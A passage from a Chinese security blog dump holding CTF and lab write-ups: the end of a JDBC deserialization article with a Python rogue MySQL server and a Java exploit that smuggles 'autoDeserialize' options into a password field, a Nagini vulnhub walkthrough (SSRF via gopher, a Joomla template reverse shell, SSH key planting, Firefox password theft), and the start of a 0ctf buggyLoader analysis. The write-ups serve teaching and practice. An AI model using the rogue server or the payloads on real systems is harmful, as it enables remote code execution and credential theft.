1756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="comment">#对于这个内置sql查询语句，设置payload响应</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>我们看恶意Mysql打印的日志，是能够接受请求包，并且发送响应包的</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20.png" class><h2 id="0x04-例题：-羊城杯-2020-a-piece-of-java"><a href="#0x04-例题：-羊城杯-2020-a-piece-of-java" class="headerlink" title="0x04 例题：[羊城杯 2020]a piece of java"></a>0x04 例题：[羊城杯 2020]a piece of java</h2><p>简单学了JDBC反序列化的原理之后，于是就在网上找了个涉及相关知识点的题做。这道题整体不是很难，所以就没在重新开一篇来写这个。</p><h3 id="题目源码分析"><a href="#题目源码分析" class="headerlink" title="题目源码分析"></a>题目源码分析</h3><p>首先看题目附件</p><p>控制器定义了三个路由，实际上只在hello路由做了反序列化</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/21.png" class><p>看它自定义的反序列化函数</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/22.png" class><p>引入了一个 serialKiller 类，它就相当于封装了一个反序列化类，serialkiller.conf的内容：</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/23.png" class><p>我们可以跟进这个类看一下</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/24.png" class><p>构造方法里去解析conf配置文件，然后就重写了 resolveClass 方法，用解析的白名单做限制，白名单中规定只能用java.lang包和程序自定义包下的类。</p><p>另外重写了一个动态代理</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/25.png" class><p>在 DatabaseInfo 类中有漏洞触发点，没有任何过滤</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/26.png" class><p>pom.xml中添加的JDBC是有漏洞的版本</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/27.png" class><p>反序列化点有了，去打什么依赖，这里比较隐晦，pom里面没有直接去添加CC依赖，</p><p>而在外部库里面是有的</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/28.png" class><p>其实它是 SerialKiller 项目的传递性依赖，添加SerialKiller依赖的时候会顺便把 common-collection 依赖下载下来，就相当于添加Springboot，会把jackson的依赖包下载下来，道理是一样。</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/29.png" class><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>现在知道了，这道题就是要打JDBC反序列化，接下来就是找调用链了</p><p>在 DatabaseInfo 类的 checkAllInfo 方法调用了 connect()</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/30.png" class><p>而在自定义的动态代理 InfoInvocationHandler 调用了 checkAllInfo 方法</p><p>剩下的就是我觉得本题最关键的点，动态代理</p><p>其实也不难，将 DatabaseInfo 类作为一个被代理类，创建一个代理对象，当每次调用被代理类的方法时，就会去调用代理类的 invoke 方法</p><p>编写exp</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">DatabaseInfo</span> <span class="variable">databaseInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseInfo</span>();</span><br><span class="line"></span><br><span class="line">        databaseInfo.setHost(<span class="string">&quot;192.168.111.128&quot;</span>);</span><br><span class="line">        databaseInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        databaseInfo.setUsername(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        databaseInfo.setPassword(<span class="string">&quot;123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">InfoInvocationHandler</span> <span class="variable">infoInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InfoInvocationHandler</span>(databaseInfo);</span><br><span class="line">        <span class="type">Info</span> <span class="variable">proxyInfo</span> <span class="operator">=</span> (Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(),databaseInfo.getClass().getInterfaces(),infoInvocationHandler);</span><br><span class="line">        serialize(proxyInfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="type">String</span> <span class="variable">basedata</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(basedata);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kali开启恶意的Mysql服务器</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/31.png" class><p>cookie传参data，发包</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/32.png" class><p>本地搭建的环境成功弹出计算器，当然也可以反弹shell或者写内存马，在这就不演示了。</p><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>这个JDBC的反序列化漏洞感觉和 shiro 有点类似，是一个不错的反序列化点。如果我们能够控制Mysql的连接配置项，以及恶意的Mysql服务器响应设置，那么我们就可以达到反序列化的目的来RCE。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> JDBC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nagini 打靶记录</title>
      <link href="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-靶场环境"><a href="#0x01-靶场环境" class="headerlink" title="0x01 靶场环境"></a>0x01 靶场环境</h2><blockquote><p>局域网网段：192.168.111.0&#x2F;24</p><p>攻击机 kali：192.168.111.140&#x2F;24</p><p>目标机 Nagini：192.168.111.134&#x2F;24</p></blockquote><h2 id="0x02-打靶目标"><a href="#0x02-打靶目标" class="headerlink" title="0x02 打靶目标"></a>0x02 打靶目标</h2><blockquote><p>拿到靶机的三个flag</p></blockquote><h2 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h2><p>用arp-scan扫描网段存活主机</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/1.png" class><p>目标主机为 192.168.111.134，再使用nmap扫描开放的端口以及服务</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/2.png" class><p>开放了web以及ssh远程登录服务。游览器访问80端口</p><p>打开就一张图片，页面源代码啥都没有</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/3.png" class><p>只好扫一下目录了</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/4.png" class><p>发现有一个php写的常见的CMS，感觉有戏</p><p>这种CMS一般都有后台，继续用dirsearch扫一下该目录下的文件和目录</p><p>是扫出来了后台，但是没有账号密码，登录不进去</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/5.png" class><p>扫出来还有个备份文件</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/6.png" class><p>下载这个备份文件打开，像是CMS的配置文件，里面有mysql数据库相关敏感信息</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/7.png" class><p>但是目前来说没什么用，找不到突破口，回头继续看主页面，刚才扫描的还有个txt文件</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/8.png" class><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/9.png" class><p>大概意思就是必须使用http3才能访问quic.nagini.hogwarts这个域名，好家伙，一般的游览器还没有应用http3，所以得下载一个google的测试版浏览器，</p><p>下载完成后用http3进行访问</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/10.png" class><p>发现一个php文件 internalResourceFeTcher.php，游览器可以直接访问到</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/11.png" class><p>到此信息收集结束。</p><h2 id="0x04-web渗透"><a href="#0x04-web渗透" class="headerlink" title="0x04 web渗透"></a>0x04 web渗透</h2><h3 id="ssrf漏洞利用"><a href="#ssrf漏洞利用" class="headerlink" title="ssrf漏洞利用"></a>ssrf漏洞利用</h3><p>在输入框中随便输入一些东西，</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/12.png" class><p>参数是url，get传参，那么试着传一个网址，例如<a href="http://www.baidu.com/">http://www.baidu.com</a></p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/13.png" class><p>跳转到百度了，如果此时这个web网站没有对用户输入的url做严格的过滤，我们可以利用这个网站做跳板，间接访问的服务器的内网地址。</p><p>利用ssrf漏洞读取本机的etc&#x2F;passwd</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/14.png" class><p>没有问题，想想怎么利用。</p><p>根据刚才信息收集到的数据库账号密码，利用这个跳板间接访问本地数据库登录并且查询数据</p><p>针对于ssrf的利用，常用Gopherus这个工具，而这个工具使用gopher协议传输数据。</p><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具。</p><p>首先要判断本站是否适用于gopher协议，可以用该协议访问一下</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/15.png" class><p>访问22端口回显出SSH的版本号，说明此协议在本网站是可用的。</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/16.png" class><p>生成的这一串payload要两次url编码，</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/17.png" class><p>可查询到相关表的数据，找到存储用户信息的表，名为joomla_users，接着查询表中的数据</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/18.png" class><p>找到了密码，但是被md5加密了</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/19.png" class><p>破解是破解不了了，直接更新掉用户密码</p><p>首先生成一个md5值</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/20.png" class><p>利用Gopherus工具将密码换成我们的</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/21.png" class><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/22.png" class><p>更新成功，账号：site_admin，，密码：123456成功登录到 joomla 框架的后台。</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/23.png" class><h3 id="代码执行漏洞利用"><a href="#代码执行漏洞利用" class="headerlink" title="代码执行漏洞利用"></a>代码执行漏洞利用</h3><p>之前打DC3也用到了这个框架的漏洞，可以在模板处修改Beez3模块的index.php的php代码来任意代码执行。</p><p>该php文件的代码是可以任意修改的</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/24.png" class><p>修改为php反弹shell的代码，修改完成后保存，用过路径访问该文件，目的是执行我们的反弹shell代码</p><p>该文件的路径为：&#x2F;joomla&#x2F;templates&#x2F;beez3&#x2F;index.php</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/25.png" class><p>成功反弹到kali机。当然也可以编写木马用蚁剑连，然后再反弹shell，不过多此一举了。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>收集信息，在web目录找到一个flag</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/26.png" class><p>接着发现家目录有两个文件，hermoine用户里的文件没有权限打开</p><p>而snape用户下都是隐藏文件，用ls -al命令查看</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/27.png" class><p>base64串，解码</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/28.png" class><p>似乎是用户的密码，22端口也是开放的，所以直接远程登录snape用户。</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/29.png" class><p>成功提权到普通用户。</p><p>查找有没有具有s权限的二进制文件，在hermoine用户的bin目录下有一个s权限的程序</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/30.png" class><p>这个程序就是执行cp的命令，在ssh远程登陆中，可以账号密码登录，也可以用公私钥对实现无密码登录。这下就有思路了，我们本地kali构造ssh密钥对，然后利用这个程序把密钥对复制到该用户目录下，就可以实现无密码登录。</p><p>首先执行ssh-keygen 生成密钥</p><p>然后利用srp命令将文件复制到sanpe用户目录下。</p><p><code>scp</code>（Secure Copy Protocol）是一个用于在不同计算机之间安全传输文件的命令行工具，它是基于SSH协议的一部分。<code>scp</code>允许在本地系统和远程系统之间复制文件和目录。</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/31.png" class><p>然后把公钥文件复制到hermoine用户的.ssh目录下</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/32.png" class><p>最后远程ssh登录用户，在家目录找到第二个flag</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/33.png" class><p>还没有提权到root，继续收集信息，在该用户目录下存在一个隐藏目录</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/34.png" class><p>看英文字母可能跟火狐游览器有关。</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/35.png" class><p>看样子是的，尝试抓取firefox中有用的密码</p><p>使用Firefox Decrypt 这个浏览器密码读取工具，使用scp首先把整个火狐游览器下载下来，下载到tmp目录</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/36.png" class><p>成功读取到root的密码，ssh远程登录</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/37.png" class><p>登陆成功，提权到root，家目录有第三个flag，到此渗透结束</p><img src="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/38.png" class><h2 id="0x05-打靶总结"><a href="#0x05-打靶总结" class="headerlink" title="0x05 打靶总结"></a>0x05 打靶总结</h2><p>和以往打的靶机不同，在提权方面，本靶机更注重于检索敏感文件和目录，查找用户密码等操作，扩展了对于提权的攻击面。</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf-2021 buggyLoader题目复现</title>
      <link href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>鸽了很久的题目，之前就下载附件分析过，但是当时没有学太多java的东西，复现的时候啥都不懂，很难进行下去。现在打算重新捡起这道题，这道java题的质量很高，于是就写下此篇文章记录一下本题复现与分析的过程。</p><h2 id="0x02-题目源码分析"><a href="#0x02-题目源码分析" class="headerlink" title="0x02 题目源码分析"></a>0x02 题目源码分析</h2><p>题目有源码附件，控制器中只定义了一个路由</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1.png" class><p>显而易见的反序列化入口，有一个if判断，这不成问题，只需要在序列化流添加这个字符串和数字就行。</p><p>但是它自己重写了一个输入流，我们跟进看一下</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/2.png" class><p>在构造方法中获取了一个 URLClassLoader 的类加载器</p><p>在 resolveClass 这个类解析方法中用 URLClassLoader 类加载器 调用 loadClass 方法进行加载。在pom.xml中有 commons-collections 的依赖可以打。</p><h2 id="0x03-loadClass无法加载数组类的相关分析"><a href="#0x03-loadClass无法加载数组类的相关分析" class="headerlink" title="0x03 loadClass无法加载数组类的相关分析"></a>0x03 loadClass无法加载数组类的相关分析</h2><p>在学习shiro框架的时候，实际上 CC6 是打不了的，至于为什么，我当时也只是浅浅的了解到 shiro框架自己重写了一个序列化器，不能解析数组，然后构造了一条能用的组合的cc链。但是我现在回头看，发现了一个问题</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/3.png" class><p>在利用类加载代码执行的cc链中，是有数组类的啊，为什么还能够被加载？</p><p>接下来调试源码分析这个问题</p><p>翻开shiro框架的源码，shiro使用默认的序列化器——DefaultSerializer  在它的反序列化函数中</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/4.png" class><p>重写了一个输入流</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/5.png" class><p>是用 ClassUtils 类的 forName 函数进行加载。将断点下载 resolveClass 函数里，开始调试</p><p>我们跟进到 forName 方法</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/6.png" class><p>它利用当前上下文的类加载器进行加载，跟进 loadClass 方法，现在要加载的就是 HashMap</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/7.png" class><p>它又获取了一个 ParallelWebappClassLoader ，它是 tomcat 中使用的，用于加载当前web应用程序的类加载器，继续跟进 loadClass 方法</p><p>我也不知道调试出什么问题了，强制步入跟进不到此方法中，全局搜索也搜不到，于是就网上视频里截了一张</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/8.png" class><p>知道这个点就行，这也不算安全方面的知识了。有个布尔变量，如果为true，那么就会用父类的Class.forName去加载类，forName 当然是可以加载数组的，因为它是原生的 ObjectInputStream 加载类的方法</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/9.png" class><p>false的话就会用findClass来加载类。</p><p>就是说，如果要加载的类是JDK内置的类，走的就是父类类加载器的 forName 方法，如果加载的类是 webapp下的类或者是导入的依赖类，就会用WebappClassLoader 类加载器用 findClass 来加载</p><p>findClass 方法是加载不了数组类的，这也证实了上面提出的疑问了。</p><p>跟进 findClass 方法看看，为什么不能加载数组类</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/10.png" class><p>这里会做一个路径的转换，</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/11.png" class><p>如果将这个类转换为带路径的class文件的话，显然是加载不到的，因为根本就没有这个路径，这也是加载不到数组类的真正原因。</p><h2 id="0x04-题目分析"><a href="#0x04-题目分析" class="headerlink" title="0x04 题目分析"></a>0x04 题目分析</h2><p>说了这么多其实就是解释 LoadClass 方法最终会走到 findClass，是加载不了数组类的</p><p>题目中直接调用 LoadClass，那么就是所有的数组类包括JDK里面的都加载不了，这也是本题最难的点</p><p>我们就可以利用二次反序列化，将受限的反序列化变成不受限的反序列化</p><p>因为数组类不能用了，所以 InvokerTransformer 类要调用的方法必须是public，而且能够走到可控的 readObject 方法中的，一般来说，需要利用一个代码分析工具，比如 codeql。但是我不会用，所以本次以复现的角度来分析这道题。</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/12.png" class><p>在 findRMIServerJRMP 方法中有可控的反序列化点，继续往上找，看看谁调用了它</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/13.png" class><p>获得一个路径，路径中必须存在 &#x2F;stub&#x2F; 这个方法传递的是 JMXServiceURL 实例，从这个实例中调用 getURLPath 方法，获取 urlPath 属性，该属性是通过构造方法写入的。所以我们需要构造一个合理路径的 JMXServiceURL 实例，才能满足条件走到 findRMIServerJRMP 方法里</p><p>继续往上跟，看看谁调用了 findRMIServer 方法，最终跟踪到 connect 方法，它是一个public 方法，可以利用 InvokerTransformer 类来调用，链子就接上了。</p><h2 id="0x05-思路总结"><a href="#0x05-思路总结" class="headerlink" title="0x05 思路总结"></a>0x05 思路总结</h2><p>因为本题目不能加载数组类，所有的CC链都打不了，所以得使用二次反序列化来打一个不受限的反序列化，因为题目中是不出网的，所以需要打入内存马。</p><p>首先，魔改CC链的执行的地方，将它走到二次反序列化。</p><p>然后再写一个原生的CC链用于打入内存马，将该链base64编码写入 urlPath 属性 属性中。</p><h2 id="0x06-题目复现"><a href="#0x06-题目复现" class="headerlink" title="0x06 题目复现"></a>0x06 